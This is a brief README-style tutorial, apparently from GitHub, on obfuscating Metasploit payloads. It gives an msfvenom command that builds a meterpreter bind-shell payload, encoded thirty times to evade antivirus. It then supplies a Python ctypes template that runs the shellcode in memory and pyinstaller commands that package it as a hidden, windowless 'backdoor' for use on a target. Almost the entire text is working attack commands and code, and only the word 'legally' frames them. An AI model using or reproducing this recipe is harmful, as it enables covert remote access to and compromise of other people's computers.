# :tophat: Metasploit Payload Obfuscation Techniques:

<p align="center">
  <img width="600" height="300" src="https://user-images.githubusercontent.com/72598486/204439872-6f102e86-2172-4c3e-a0dd-e82bcca70711.png">
</p>

Utilize Metasploit's ```msfvenom``` to create your desired payload:

```bash
$ msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai '\x00' -i 30 RHOST=10.0.0.68 LPORT=9050 -f c | tr -d '"' | tr -d '\n' | more
```

Grab the string produced for creating your payload and plug it into the template below:

```python
from ctypes import *

shellcode = '<your shellcode, ex: \xda\xdc\xd9\>'
memorywithshell = create_string_buffer(shellcode, len(shellcode))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
```

Compile the backdoor with ```pyinstaller```

```bash
$ python configure.py
$ python makespec.py --onefile --noconsole shell_template.py
$ python build.py shell_template\shell_template.spec
```

This will produce your obfuscated payload which you can use on your target (legally)
